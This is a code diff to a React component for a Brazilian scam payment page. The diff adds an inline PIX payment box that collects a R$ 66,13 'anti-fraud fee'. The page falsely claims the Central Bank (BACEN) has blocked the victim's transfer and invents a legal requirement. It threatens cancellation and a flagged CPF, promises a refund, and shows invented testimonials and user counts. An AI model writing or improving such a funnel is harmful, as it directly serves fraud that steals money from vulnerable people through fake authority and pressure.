@@ -1,12 +1,14 @@
 import { useState } from "react";
 import { Loader2, ChevronDown, ChevronUp } from "lucide-react";
 import StickyCtaBar from "./StickyCtaBar";
+import InlinePixSection from "./InlinePixSection";
 import pixLogo from "@/assets/pix-logo.svg";
 import testimonial1 from "@/assets/testimonial-1.jpg";
 import testimonial2 from "@/assets/testimonial-2.jpg";
 import testimonial3 from "@/assets/testimonial-3.jpg";
+import { PixPaymentData } from "./types";
 
-interface FunnelUpsellAntiFraudeProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; }
+interface FunnelUpsellAntiFraudeProps { balance: string; onGeneratePix: () => void; isGenerating: boolean; leadCpf?: string; leadName?: string; pixData?: PixPaymentData | null; onCopyPix?: () => void; isPixCopied?: boolean; onManualCheck?: () => void; isCheckingPayment?: boolean; checkError?: string | null; }
 
 const TestimonialCard = ({ avatar, name, location, time, text, amount }: { avatar: string; name: string; location: string; time: string; text: string; amount: string }) => (
   <div className="bg-white rounded-xl p-3 shadow-sm border border-gray-50">
@@ -26,8 +28,9 @@ const FaqItem = ({ question, answer }: { question: string; answer: string }) => 
   );
 };
 
-const FunnelUpsellAntiFraude = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName }: FunnelUpsellAntiFraudeProps) => {
+const FunnelUpsellAntiFraude = ({ balance, onGeneratePix, isGenerating, leadCpf, leadName, pixData, onCopyPix, isPixCopied, onManualCheck, isCheckingPayment, checkError }: FunnelUpsellAntiFraudeProps) => {
   const firstName = leadName ? leadName.split(" ")[0] : "";
+  const showPixInline = !!pixData?.pix_code;
   return (
     <div className="fixed inset-0 z-[80] bg-[#F0F2F5] overflow-y-auto pt-6">
       <div className="bg-[#D32F2F] py-3 px-4"><h1 className="text-white text-sm font-bold text-center tracking-wide flex items-center justify-center gap-2">⚠️ TRANSFERÊNCIA BLOQUEADA PELO BACEN</h1></div>
@@ -43,12 +46,17 @@ const FunnelUpsellAntiFraude = ({ balance, onGeneratePix, isGenerating, leadCpf,
           <p className="text-red-500 text-[10px] font-semibold text-center mb-3">❌ {firstName ? `${firstName}, sem` : "Sem"} verificação = perda total de {balance}</p>
           <div className="flex items-center justify-center gap-1 mt-3"><span className="text-[10px] text-gray-400">🔐 Pagamento seguro via PIX</span><span className="text-gray-300 text-[10px]">•</span><span className="text-[10px] text-gray-400">Reembolso garantido</span></div>
         </div>
+
+        {showPixInline && pixData && (
+          <InlinePixSection pixData={pixData} amount="R$ 66,13" label="Proteção Anti-Fraude" onCopy={onCopyPix} isCopied={isPixCopied} onManualCheck={onManualCheck} isCheckingPayment={isCheckingPayment} checkError={checkError} accentColor="#00A651" />
+        )}
+
         <div className="bg-white rounded-xl p-3 mt-3 shadow-sm"><p className="text-gray-500 text-[11px] text-center leading-relaxed"><span className="font-bold text-gray-700">12.847 pessoas</span> já verificaram e receberam o saldo nos últimos 7 dias.</p></div>
         <div className="mt-3"><p className="text-gray-600 text-xs font-bold text-center mb-2">Perguntas frequentes</p><div className="space-y-2"><FaqItem question="Por que preciso pagar essa tarifa?" answer="O protocolo DICT do Banco Central EXIGE a verificação anti-fraude para qualquer movimentação acima de R$ 2.000. Sem ela, o sistema cancela a transferência permanentemente em 24 horas. Não é opcional — é uma exigência legal." /><FaqItem question="Vou receber o reembolso da tarifa?" answer="Sim, 100% garantido. O valor de R$ 66,13 retorna automaticamente em até 2 minutos após a verificação. Você recebe o reembolso + seu saldo completo. Risco zero." /><FaqItem question="O que acontece se eu NÃO pagar?" answer="Seu saldo será CANCELADO permanentemente em 24 horas. O valor será devolvido ao remetente, seu CPF será marcado como suspeito no BACEN e você ficará impedido de receber transferências PIX por até 180 dias." /><FaqItem question="É seguro pagar via PIX?" answer="Totalmente seguro. O PIX é regulamentado pelo Banco Central do Brasil com criptografia de ponta a ponta." /><FaqItem question="Quanto tempo leva para receber meu saldo?" answer="Após o pagamento da tarifa, a liberação é INSTANTÂNEA. Em média, o PIX cai em menos de 3 minutos." /></div></div>
         <div className="mt-3 space-y-2.5"><p className="text-gray-600 text-xs font-bold text-center">Quem já recebeu:</p><TestimonialCard avatar={testimonial1} name="Mariana S." location="São Paulo, SP" time="há 12 min" text="Eu achei que era golpe, mas paguei a tarifa e em menos de 2 minutos o PIX de R$ 3.241,00 caiu na minha conta." amount="R$ 3.241,00" /><TestimonialCard avatar={testimonial2} name="Carlos A." location="Belo Horizonte, MG" time="há 38 min" text="Fiquei com medo no início, mas vi que era protocolo do Banco Central mesmo. Paguei e recebi meu saldo inteiro." amount="R$ 2.876,50" /><TestimonialCard avatar={testimonial3} name="Fernanda L." location="Rio de Janeiro, RJ" time="há 1h" text="Quase desisti achando que ia perder dinheiro. Mas a tarifa voltou certinho e meu saldo caiu rapidinho." amount="R$ 2.654,30" /></div>
         <p className="text-gray-400 text-[10px] text-center mt-4 pb-6">© 2025 Sistema de Verificação Bancária. Protocolo DICT/BACEN.</p>
       </main>
-      <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="DESBLOQUEAR SALDO NO BACEN" bgColor="bg-[#00A651]" shadowColor="shadow-green-200" />
+      {!showPixInline && <StickyCtaBar onClick={onGeneratePix} isGenerating={isGenerating} label="DESBLOQUEAR SALDO NO BACEN" bgColor="bg-[#00A651]" shadowColor="shadow-green-200" />}
     </div>
   );
 };
